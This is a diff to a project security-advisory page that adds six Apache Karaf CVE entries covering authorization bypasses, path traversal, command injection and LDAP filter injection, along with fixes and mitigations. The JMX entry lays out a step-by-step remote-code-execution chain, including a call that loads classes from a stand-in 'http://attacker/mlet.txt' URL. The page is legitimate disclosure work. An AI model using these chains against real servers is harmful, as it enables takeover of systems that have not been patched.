@@ -122,67 +122,172 @@
 <ul>
 <li>Baoquan Cui &amp; Yucheng Qiu (reporter)</li>
 </ul>
+<h2 id="CVE-2026-92142">Authorization bypass in JMX MBean lifecycle operations</h2>
+<p>CVE-2026-92142 <a href="https://cve.org/CVERecord?id=CVE-2026-92142">[CVE]</a> <a href="./CVE-2026-92142.cve.json">[CVE json]</a> <a href="./CVE-2026-92142.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2026-09-29T08:40:06.994Z</em></p>
+<h3 id="affected-1">Affected</h3>
+<ul>
+<li>Apache Karaf before 4.4.12</li>
+</ul>
+<h3 id="description-1">Description</h3>
+<p>Apache Karaf exposes a JMX MBeanServer guarded by <code>KarafMBeanServerGuard</code>, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a j<code>ava.lang.reflect.Proxy</code> around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in <code>MBeanInvocationHandler#guarded</code>:<div><br></div><div><code>  private final List&lt;String&gt; guarded = Collections.unmodifiableList( Arrays.asList(&ldquo;invoke&rdquo;, &ldquo;getAttribute&rdquo;, &ldquo;getAttributes&rdquo;, &ldquo;setAttribute&rdquo;, &ldquo;setAttributes&rdquo;));</code></div><div><br></div><div>The MBean lifecycle operations <code>MBeanServer#createMBean</code>, <code>#registerMBean</code> and <code>#unregisterMBean</code> are not in this list. Calls to these methods are forwarded directly to the underlying <code>MBeanServer</code> with no role check at all, regardless of the roles configured in <span>etc/jmx.acl.<em>.cfg.</span></div><div><br></div><div>As a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged &ldquo;<code>viewer</code>&rdquo; role, can call <code>createMBean()</code> to instantiate an arbitrary class as a MBean, and <code>unregisterMBean()</code> to remove it again afterwards, with no authorization check and no audit log entry (logging in <code>KarafMBeanServerGuard</code> only occurs on the RBAC-denial path, which this bypass never reaches).</div><div><br></div><div>This is significant because <code>javax.management.loading.MLet</code>, a standard JDK MBean, can be instantiated this way. <code>MLet</code> acts as a remote classloader: its <code>getMBeansFromURL(URL)</code> operation fetches an <code>MLet</code> text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through <code>KarafMBeanServerGuard</code>&rsquo;s existing &ldquo;invoke&rdquo; check, but the default <code>etc/jmx.acl.cfg</code> grants the &ldquo;<code>viewer</code>&rdquo; role to any method name matching the wildcard rule &ldquo;<code>get</em> = viewer</code>&rdquo;, a heuristic intended for read-only getters. Because &ldquo;<code>getMBeansFromURL</code>&rdquo; happens to start with &ldquo;<code>get</code>&rdquo;, it also matches that rule, so a default installation grants &ldquo;viewer&rdquo; callers permission to invoke it without any Karaf-specific ACL naming <code>MLet</code> at all. Combined with the createMBean gap, this gives a &ldquo;<code>viewer</code>&quot;-role JMX client a path to remote code execution to the Karaf JVM:</div><div><ol><li>Authenticate to JMX as any user with any role (e.g. &ldquo;<code>viewer</code>&rdquo;).</li><li><code>mbs.createMBean(&ldquo;javax.management.loading.MLet&rdquo;, objectName)</code> is not in <code>GUARDED_OPERATIONS</code>, no RBAC check, MLet is instantiated and registered.</li><li><code>mbs.invoke(objectName, &ldquo;getMBeansFromURL&rdquo;, new Object[]{&ldquo;http://attacker/mlet.txt&rdquo;}, &hellip;)</code> is guarded, but the method name matches the default &ldquo;<code>get* = viewer</code>&rdquo; ACL rule, so permitted.</li><li>The remote <code>.mlet</code> file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.</li><li><code>mbs.unregisterMBean(objectName)</code> can be used to remove the MLet afterwards, also not in <code>GUARDED_OPERATIONS</code>, no RBAC check, no audit trail.</li></ol></div><div>The fix adds <code>createMBean</code>, <code>registerMBean</code> and <code>unregisterMBean</code> to the guarded operation list, resolves required roles for them from the <code>jmx.acl*</code> configuration by <code>ObjectName</code> and (for <code>createMBean</code>/<code>registerMBean</code>) MBean class name, and ships default <code>etc/jmx.acl.cfg</code> entries restricting all three operations to the &ldquo;<code>admin</code>&rdquo; role. This allows deployments to also write class-name-specific rule, e.g.:</div><div><br></div><div><code>createMBean(java.lang.String)[/javax.management.loading..*/] = admin</code></div><div><br></div><div>Apache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-&quot;<code>admin</code>&rdquo; JMX credentiels.</div></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://karaf.apache.org/security/cve-2026-92142.txt">https://karaf.apache.org/security/cve-2026-92142.txt</a></li>
+</ul>
+<h3 id="credits-1">Credits</h3>
+<ul>
+<li>MopMonk-AI <a href="mailto:mopmonk-ai@tophant.com">mopmonk-ai@tophant.com</a> (reporter)</li>
+</ul>
+<h2 id="CVE-2026-91085">config:install missing ACL entry allows privilege escalation to admin</h2>
+<p>CVE-2026-91085 <a href="https://cve.org/CVERecord?id=CVE-2026-91085">[CVE]</a> <a href="./CVE-2026-91085.cve.json">[CVE json]</a> <a href="./CVE-2026-91085.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2026-09-29T08:39:32.106Z</em></p>
+<h3 id="affected-2">Affected</h3>
+<ul>
+<li>Apache Karaf before 4.4.12</li>
+</ul>
+<h3 id="description-2">Description</h3>
+<p>Apache Karaf&rsquo;s shell/SSH command security is enforced by per-scope ACL configuration files (<code>etc/org.apache.karaf.command.acl.&lt;scope&gt;.cfg</code>). <code>SecuredSessionFactoryImpl.checkSecurity()</code> resolves the roles required for an invocation and, when no ACL rule matches the command, <b>fails open</b>: <code>ACLConfigurationParser.Specificity.NO_MATCH</code> sets <code>passCheck = true</code>. The safety valve for this, <code>karaf.secured.command.compulsory.roles</code>, ships commented out in <code>etc/system.properties</code>, so an unmatched command is allowed for any authenticated user.<div><br></div><div>The shipped <code>org.apache.karaf.command.acl.config</code> ACL (<code>assemblies/features/standard/src/main/feature/feature.xml</code>, mirrored into <code>instance/&hellip;/etc/org.apache.karaf.command.acl.config.cfg</code>) has no <code>install</code> entry. It restricts <code>delete</code> to <code>admin</code>, restricts <code>edit</code>/<code>property-<em></code>/<code>update</code> on the <code>jmx.acl.</em></code>, <code>org.apache.karaf.command.acl.<em></code> and <code>org.apache.karaf.service.acl.</em></code> PIDs to <code>admin</code>, and allows <code>manager</code> for everything else, but <code>config:install</code> was simply unmatched, and therefore allowed for any authenticated user, including one holding only the <code>viewer</code> role.</div><div><br></div><div><span>config:install &lt;url&gt; &lt;finalname&gt;</span> fetches <code>url</code> and writes it into <code>${karaf.etc}</code> as <code>finalname</code>. It calls <code>PathUtils.checkWithin()</code> to block <code>..</code> traversal outside <code>karaf.etc</code>, but that folder holds every security-relevant file Karaf ships: <code>users.properties</code>, <code>keys.properties</code>, <code>host.key</code>, and all <code>org.apache.karaf.<em>.acl.</em></code> files, including the very ACL file that (mis)governs this command. With <code>-o</code>/<code>&ndash;override</code>, an existing file is overwritten with attacker-controlled bytes fetched from an arbitrary URL.</div><div><br></div><div>Because <code>felix.fileinstall.dir = ${karaf.etc}</code> (<code>etc/config.properties</code>), Felix FileInstall also watches and reloads any <code>.cfg</code> file dropped there, closing the loop without requiring a restart.</div><div><br></div><div>By contrast, <code>bundle:install</code>, <code>feature:install</code> and <code>kar:install</code> are all <code>admin</code>-only in their own ACLs, and <code>config:delete</code> is <code>admin</code> in this same ACL, <code>config:install</code> was the outlier.</div><h3>Mitigation</h3><div>Add <code>install = admin</code> in <code>etc/org.apache.karaf.command.acl.config.cfg</code> (create the file is absent), and/or set <code>karaf.secured.command.compulsory.roles=admin</code> in <code>etc/system.properties</code> (and restart) to make unmatched commands fail closed by default.</div></p>
+<h3 id="references-2">References</h3>
+<ul>
+<li><a href="https://karaf.apache.org/security/cve-2026-91085.txt">https://karaf.apache.org/security/cve-2026-91085.txt</a></li>
+</ul>
+<h3 id="credits-2">Credits</h3>
+<ul>
+<li>Rin Ray <a href="mailto:rindilray@gmail.com">rindilray@gmail.com</a> (reporter)</li>
+</ul>
+<h2 id="CVE-2026-91048">Missing authorization on the jdbc:* shell command scope allows privilege escalation to remote code execution via jdbc:ds-create</h2>
+<p>CVE-2026-91048 <a href="https://cve.org/CVERecord?id=CVE-2026-91048">[CVE]</a> <a href="./CVE-2026-91048.cve.json">[CVE json]</a> <a href="./CVE-2026-91048.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2026-09-29T08:34:45.991Z</em></p>
+<h3 id="affected-3">Affected</h3>
+<ul>
+<li>Apache Karaf before 4.4.12</li>
+</ul>
+<h3 id="description-3">Description</h3>
+<p>The <code>jdbc</code> shell command scope shipped no <code>org.apache.karaf.command.acl.jdbc.cfg</code>. Karaf&rsquo;s command guard (<code>SecuredSessionFactoryImpl</code>) treats a command with no matching ACL rule as <b>allowed</b>, so any authenticated shell session (including one holding only the <code>viewer</code> role) could run every <code>jdbc:<em></code> command. <code>jdbc:ds-create</code> stores a fully attacker-controlled JDBC URL into a <code>pax-jdbc-config</code> factory <code>Configuration</code> with no validation. <code>pax-jdbc-config</code> reactively turns that into a live <code>DataSource</code>. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2 <code>INIT=RUNSCRIPT</code>), so a <code>viewer</code>-level shell user could reach arbitrary code execution, bypassing the <code>admin</code>-role gate that already protects <code>shell:exec</code>. This is a privilege-escalation-to-RCE chain, not merely an &ldquo;admin misconfiguration&rdquo;.<div><br></div><div>The same applies to <code>jms:</em></code> shell commands.</div></p>
+<h3 id="references-3">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/ph3867mxh2tft75w0o1hpn10f5mbmw32">https://lists.apache.org/thread/ph3867mxh2tft75w0o1hpn10f5mbmw32</a></li>
+</ul>
+<h3 id="credits-3">Credits</h3>
+<ul>
+<li>MopMonk-AI <a href="mailto:mopmonk-ai@tophant.com">mopmonk-ai@tophant.com</a> (reporter)</li>
+</ul>
+<h2 id="CVE-2026-91012">Path Traversal in Config Service Allows Manager-to-Admin Privilege Escalation</h2>
+<p>CVE-2026-91012 <a href="https://cve.org/CVERecord?id=CVE-2026-91012">[CVE]</a> <a href="./CVE-2026-91012.cve.json">[CVE json]</a> <a href="./CVE-2026-91012.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2026-09-29T08:34:10.036Z</em></p>
+<h3 id="affected-4">Affected</h3>
+<ul>
+<li>Apache Karaf before 4.4.12</li>
+</ul>
+<h3 id="description-4">Description</h3>
+<div><span>org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties)</span>,
+which backs the "config" MBean and the config:* shell commands, derives the file
+it writes a configuration to from caller-supplied input without checking that
+the result stays inside&nbsp;<code>${karaf.etc}</code>:</div><div><ul><li>if the submitted property map contains a&nbsp;<code>felix.fileinstall.filename</code>&nbsp;entry, that value is turned directly into a&nbsp;<code>File</code>&nbsp;(<code>getCfgFileFromProperty</code>), so it can point to any absolute path the Karaf process can write to;</li><li>otherwise the configuration PID is concatenated verbatim into the target file name (<code>generateConfigFilename(): new File(karaf.etc, pid + ".cfg")</code>), so a PID containing ".." segments resolves outside&nbsp;<code>${karaf.etc}</code>.&nbsp;<code>createFactoryConfiguration()</code>&nbsp;has the same issue via the factory PID/alias.</li></ul><div>Both code paths are reachable by any caller holding the "manager" role under Karaf's shipped command/JMX ACL (<code>org.apache.karaf.command.acl.conf.cfg:</code>&nbsp;"<code>update = manager</code>"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to "<code>admin</code>" (<code>etc/users.properties</code>,&nbsp;<code>etc/*.acl.*.cfg</code>,&nbsp;<code>etc/org.apache.karaf.management.cfg</code>, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.</div></div><div><br></div><div><span>ConfigMBeanImpl.install()</span>&nbsp;and the&nbsp;<code>config:install</code>&nbsp;shell command already guarded the equivalent risk on their own code path with a&nbsp;<code>finalname.contains("..")</code>&nbsp;string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to&nbsp;<code>ConfigRepositoryImpl.update()</code>&nbsp;/&nbsp;<code>createFactoryConfiguration()</code>&nbsp;at all.</div>
+<h3 id="references-4">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/op8trtz1qxkdwj2rjozhd9yt2yd6nhw4">https://lists.apache.org/thread/op8trtz1qxkdwj2rjozhd9yt2yd6nhw4</a></li>
+</ul>
+<h3 id="credits-4">Credits</h3>
+<ul>
+<li>n0mi1k <a href="mailto:nomilksec@gmail.com">nomilksec@gmail.com</a> (reporter)</li>
+</ul>
+<h2 id="CVE-2026-91006">OS Command Injection in Child-Instance Launch (instance:* / InstancesMBean)</h2>
+<p>CVE-2026-91006 <a href="https://cve.org/CVERecord?id=CVE-2026-91006">[CVE]</a> <a href="./CVE-2026-91006.cve.json">[CVE json]</a> <a href="./CVE-2026-91006.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2026-09-28T10:44:31.268Z</em></p>
+<h3 id="affected-5">Affected</h3>
+<ul>
+<li>Apache Karaf before 4.4.12</li>
+</ul>
+<h3 id="description-5">Description</h3>
+<p>Apache Karaf&rsquo;s instance-management service (<code>InstanceServiceImpl</code>) builds the command line used to launch a child Karaf JVM by string concatenation, then executes it through <code>/bin/sh </code>(Unix) or <code>cscript</code> (Windows). The caller-supplied <code>javaOpts</code> value is spliced into that string unquoted. A javaOpts value containing shell metacharacters (<code>;</code>, <code>|</code>, <code>`</code>, <code>$(&hellip;)</code>) is interpreted by the shell instead of being passed to the JVM as an option, giving arbitrary OS command execution as the Karaf process user.<div><br></div><div>Reachable via the shell commands <code>instance:create</code>, <code>instance:start</code>, <code>instance:restart</code>, <code>instance:change-opts</code>, and the equivalent <code>InstanceMBean</code> JMX operations (<code>createInstance</code>, <code>startInstance</code>, <code>changeJavaOpts</code>, <code>cloneInstance</code>).</div><h3>Mitigation </h3><div><ul><li>Set <code>karaf.secured.command.compulsory.roles=admin</code> in <code>etc/system.properties</code> to close the fail-open gap for all unconfigured command scopes.</li><li>Restrict which principals can reach <code>instance:*</code> commands and <code>InstancesMBean</code> via <code>etc/users.properties</code> role assignments.</li><li>Treat <code>javaOpts</code> passed to i<code>nstance:create</code>/<code>instance:start</code>/<code>instance:change-opts</code>/<code>InstancesMBean</code> as untrusted input only from fully-trusted operators.</li></ul></div><div><br></div></p>
+<h3 id="references-5">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/olzy0yjw82b20w59vonfjr1x7v5yzocr">https://lists.apache.org/thread/olzy0yjw82b20w59vonfjr1x7v5yzocr</a></li>
+</ul>
+<h3 id="credits-5">Credits</h3>
+<ul>
+<li>n0mi1k <a href="mailto:nomilksec@gmail.com">nomilksec@gmail.com</a> (reporter)</li>
+</ul>
+<h2 id="CVE-2026-90979">LDAP filter injection in JAAS LDAP login modules</h2>
+<p>CVE-2026-90979 <a href="https://cve.org/CVERecord?id=CVE-2026-90979">[CVE]</a> <a href="./CVE-2026-90979.cve.json">[CVE json]</a> <a href="./CVE-2026-90979.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2026-09-28T09:34:23.941Z</em></p>
+<h3 id="affected-6">Affected</h3>
+<ul>
+<li>Apache Karaf before 4.4.12</li>
+</ul>
+<h3 id="description-6">Description</h3>
+<p><span>LDAPCache</span>&nbsp;and&nbsp;<code>LDAPBackingEngine</code>&nbsp;build LDAP search filters for user lookup and role lookup by textually substituting the placeholders&nbsp;<code>%u</code>,&nbsp;<code>%dn</code>, and&nbsp;<code>%fqdn</code>&nbsp;(drawn from the login name, the resolved user DN, and its fully qualified namespace form) into administrator-configured filter templates (<code>userFilter</code>,&nbsp;<code>roleFilter</code>). Before the fix, the only sanitization applied to the substituted value was double backslashed:</p><div><code>filter = filter.replaceAll(Pattern.quote("%u"), Matcher.quoteReplacement(user));</code></div><div><code>filter = filter.replace("\\", "\\\\");</code></div><div><br></div><div>This does not escape the other characters RFC 4515 requires escaping in an LDAP search filter:&nbsp;<code>*</code>,&nbsp;<code>(</code>,&nbsp;<code>)</code>, and&nbsp;<code>NUL</code>. A login name containing any of these can change the structure of the resulting filter rather than being matched as a literal value (e.g. a crafted username can turn an equality match into a wildcard match, or close/reopen filter clauses), widening what the search returns and potentially causing a login or role lookup to match an LDAP entry other than the intended one, over-granting roles, and depending on deployment-specific filter templates, potentially affecting which account a login resolved to.</div><div><br></div><div>It's not exploitable through every entry points:&nbsp;<code>LDAPLoginModule</code>&nbsp;and&nbsp;<code>LDAPPubkeyLoginModule</code>&nbsp;both called&nbsp;<code>Util.doRFC2254Encoding()</code>&nbsp;(correct RFC 4515 escaping) on the login name before handing it to&nbsp;<code>LDAPCache</code>, which masked the missing escaping in&nbsp;<code>LDAPCache</code>&nbsp;for those two call paths. Using&nbsp;<code>LDAPCache</code>&nbsp;directly (bypassing the login modules) does not reproduce through the normal&nbsp;<code>LDAPLoginModule</code>/<code>LDAPPubkeyLoginModule</code>&nbsp;authentication flow for this reason. It does reproduce through two other call paths that reach&nbsp;<code>LDAPCache</code>/<code>LDAPBackingEngine</code>&nbsp;without any prior escaping:</div><div><ul><li><code>GSSAPILdapLoginModule</code>&nbsp;passes the&nbsp;<code>NameCallback</code>&nbsp;name straight through, unescaped.</li><li><code>LDAPBackingEngine</code>&nbsp;(<code>listRoles</code>) passes&nbsp;<code>principal.getName()</code>&nbsp;straight through, unescaped.</li></ul><div><br></div></div>
+<h3 id="references-6">References</h3>
+<ul>
+<li><a href="https://karaf.apache.org/security/cve-2026-90979.txt">https://karaf.apache.org/security/cve-2026-90979.txt</a></li>
+</ul>
+<h3 id="credits-6">Credits</h3>
+<ul>
+<li>Gjoko Krstic <a href="mailto:gjoko@zeroscience.mk">gjoko@zeroscience.mk</a> (reporter)</li>
+</ul>
 <h2 id="CVE-2026-24656">Decanter log-socket collector has deserialization vulnerability</h2>
 <p>CVE-2026-24656 <a href="https://cve.org/CVERecord?id=CVE-2026-24656">[CVE]</a> <a href="./CVE-2026-24656.cve.json">[CVE json]</a></p>
 <p><em>Last updated: 2026-01-26T09:41:22.803Z</em></p>
-<h3 id="affected-1">Affected</h3>
+<h3 id="affected-7">Affected</h3>
 <ul>
 <li>Apache Karaf before 2.12.0</li>
 <li>Apache Karaf at 2.12.0 unaffected</li>
 </ul>
-<h3 id="description-1">Description</h3>
+<h3 id="description-7">Description</h3>
 <p>Deserialization of Untrusted Data vulnerability in Apache Karaf Decanter.</p><br>The Decanter log socket collector exposes the port 4560, without authentication. If the collector exposes allowed classes property, this configuration can be bypassed.<br>It means that the log socket collector is vulnerable to deserialization of untrusted data, eventually causing DoS.<br><br><br>NB: Decanter log socket collector is not installed by default. Users who have not installed Decanter log socket are not impacted by this issue.<br><br><p>This issue affects Apache Karaf Decanter before 2.12.0.</p><p>Users are recommended to upgrade to version 2.12.0, which fixes the issue.</p>
-<h3 id="references-1">References</h3>
+<h3 id="references-7">References</h3>
 <ul>
 <li><a href="https://lists.apache.org/thread/dc5wmdn6hyc992olntkl75kk04ndzx34">https://lists.apache.org/thread/dc5wmdn6hyc992olntkl75kk04ndzx34</a></li>
 </ul>
-<h3 id="credits-1">Credits</h3>
+<h3 id="credits-7">Credits</h3>
 <ul>
 <li>r00t4dm (finder)</li>
 </ul>
 <h2 id="CVE-2024-34365">Cave SSRF and arbitrary file access</h2>
 <p>CVE-2024-34365 <a href="https://cve.org/CVERecord?id=CVE-2024-34365">[CVE]</a> <a href="./CVE-2024-34365.cve.json">[CVE json]</a> <a href="./CVE-2024-34365.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2024-05-09T06:49:03.305Z</em></p>
-<h3 id="affected-2">Affected</h3>
+<h3 id="affected-8">Affected</h3>
 <ul>
 <li>Apache Karaf Cave through *</li>
 </ul>
-<h3 id="description-2">Description</h3>
+<h3 id="description-8">Description</h3>
 <p>** UNSUPPORTED WHEN ASSIGNED ** Improper Input Validation vulnerability in Apache Karaf Cave.<p>This issue affects all versions of Apache Karaf Cave.</p>As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.<p>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p></p>
-<h3 id="references-2">References</h3>
+<h3 id="references-8">References</h3>
 <ul>
 <li><a href="https://karaf.apache.org/security/cve-2024-34365.txt">https://karaf.apache.org/security/cve-2024-34365.txt</a></li>
 </ul>
-<h3 id="credits-2">Credits</h3>
+<h3 id="credits-8">Credits</h3>
 <ul>
 <li>cigar (finder)</li>
 </ul>
 <h2 id="CVE-2022-40145">JDBC JAAS LDAP injection</h2>
 <p>CVE-2022-40145 <a href="https://cve.org/CVERecord?id=CVE-2022-40145">[CVE]</a> <a href="./CVE-2022-40145.cve.json">[CVE json]</a> <a href="./CVE-2022-40145.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2022-12-21T15:53:26.357Z</em></p>
-<h3 id="affected-3">Affected</h3>
+<h3 id="affected-9">Affected</h3>
 <ul>
 <li>Apache Karaf from 4.4.0 before 4.4.2</li>
 <li>Apache Karaf before 4.3.8</li>
 </ul>
-<h3 id="description-3">Description</h3>
+<h3 id="description-9">Description</h3>
 <p><span style="background-color: rgb(255, 255, 255);">This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.<br><br>The function jaas.modules.src.main.java.por</span><span style="background-color: rgb(255, 255, 255);">g.apache.karaf.jass.modules.</span><span style="background-color: rgb(255, 255, 255);">jdbc.JDBCUtils#doCreateDatasou</span><span style="background-color: rgb(255, 255, 255);">rce</span><br><span style="background-color: rgb(255, 255, 255);">use InitialContext.lookup(jndiName</span><span style="background-color: rgb(255, 255, 255);">) without filtering.<br>An user can modify </span><span style="background-color: rgb(255, 255, 255);"><code>options.put(JDBCUtils.DATASOU&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255);&quot;&gt;RCE, &quot;osgi:&quot; +&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255);&quot;&gt;DataSource.class.getName());</code> to <code>options.put(JDBCUtils.DATASOU&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255);&quot;&gt;RCE,&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255);&quot;&gt;&quot;jndi:rmi://x.x.x.x:xxxx/Comma&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255);&quot;&gt;nd&quot;);</code> in JdbcLoginModuleTest#setup.</span><br><br><span style="background-color: rgb(255, 255, 255);">This is vulnerable to a remote code execution (RCE) attack when a</span><br><span style="background-color: rgb(255, 255, 255);">configuration uses a JNDI LDAP data source URI when an attacker has</span><br><span style="background-color: rgb(255, 255, 255);">control of the target LDAP server.</span><p>This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.</p>We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8</p>
-<h3 id="references-3">References</h3>
+<h3 id="references-9">References</h3>
 <ul>
 <li><a href="https://karaf.apache.org/security/cve-2022-40145.txt">https://karaf.apache.org/security/cve-2022-40145.txt</a></li>
 </ul>
-<h3 id="credits-3">Credits</h3>
+<h3 id="credits-9">Credits</h3>
 <ul>
 <li>Xun Bai <a href="mailto:bbbbear68@gmail.com">bbbbear68@gmail.com</a> (reporter)</li>
 </ul>
 <h2 id="CVE-2022-22932">Path traversal flaws</h2>
 <p>CVE-2022-22932 <a href="https://cve.org/CVERecord?id=CVE-2022-22932">[CVE]</a> <a href="./CVE-2022-22932.cve.json">[CVE json]</a> <a href="./CVE-2022-22932.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2022-01-25T14:53:17.546Z</em></p>
-<h3 id="affected-4">Affected</h3>
+<h3 id="affected-10">Affected</h3>
 <ul>
 <li>Apache Karaf from Apache Karaf before 4.2.15</li>
 </ul>
-<h3 id="description-4">Description</h3>
+<h3 id="description-10">Description</h3>
 <p>Apache Karaf obr:* commands and run goal on the karaf-maven-plugin have partial
 path traversal which allows to break out of expected folder.</p>
 <p>The risk is low as obr:* commands are not very used and the entry is set by user.</p>
@@ -192,22 +297,22 @@ path traversal which allows to break out of expected folder.</p>
 <p>Mitigation: Apache Karaf users should upgrade to 4.2.15 or 4.3.6
 or later as soon as possible, or use correct path.</p>
 <p>JIRA Tickets: <a href="https://issues.apache.org/jira/browse/KARAF-7326">https://issues.apache.org/jira/browse/KARAF-7326</a></p>
-<h3 id="references-4">References</h3>
+<h3 id="references-10">References</h3>
 <ul>
 <li><a href="https://karaf.apache.org/security/cve-2022-22932.txt">https://karaf.apache.org/security/cve-2022-22932.txt</a></li>
 </ul>
-<h3 id="credits-4">Credits</h3>
+<h3 id="credits-10">Credits</h3>
 <ul>
 <li>This issue was discovered and reported by GHSL team member Jaroslav Lobacevski</li>
 </ul>
 <h2 id="CVE-2021-41766">Insecure Java Deserialization in Apache Karaf</h2>
 <p>CVE-2021-41766 <a href="https://cve.org/CVERecord?id=CVE-2021-41766">[CVE]</a> <a href="./CVE-2021-41766.cve.json">[CVE json]</a> <a href="./CVE-2021-41766.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2022-01-25T14:39:43.793Z</em></p>
-<h3 id="affected-5">Affected</h3>
+<h3 id="affected-11">Affected</h3>
 <ul>
 <li>Apache Karaf from Apache Karaf before 4.3.6</li>
 </ul>
-<h3 id="description-5">Description</h3>
+<h3 id="description-11">Description</h3>
 <p>Apache Karaf allows monitoring of applications and the Java runtime by
 using the Java Management Extensions (JMX).
 JMX is a Java RMI based technology that relies on Java serialized
@@ -222,11 +327,11 @@ Generally speaking, deserialization of untrusted data does always
 represent a high security risk and should be prevented.</p>
 <p>The risk is low as, by default, Karaf uses a limited set of classes in the JMX server class path.
 It depends of system scoped classes (e.g. jar in the lib folder).</p>
-<h3 id="references-5">References</h3>
+<h3 id="references-11">References</h3>
 <ul>
 <li><a href="https://karaf.apache.org/security/cve-2021-41766.txt">https://karaf.apache.org/security/cve-2021-41766.txt</a></li>
 </ul>
-<h3 id="credits-5">Credits</h3>
+<h3 id="credits-11">Credits</h3>
 <ul>
 <li>This issue was reported by Daniel Heyne, Konstantin Samuel and Tobias Neitzel.</li>
 </ul>
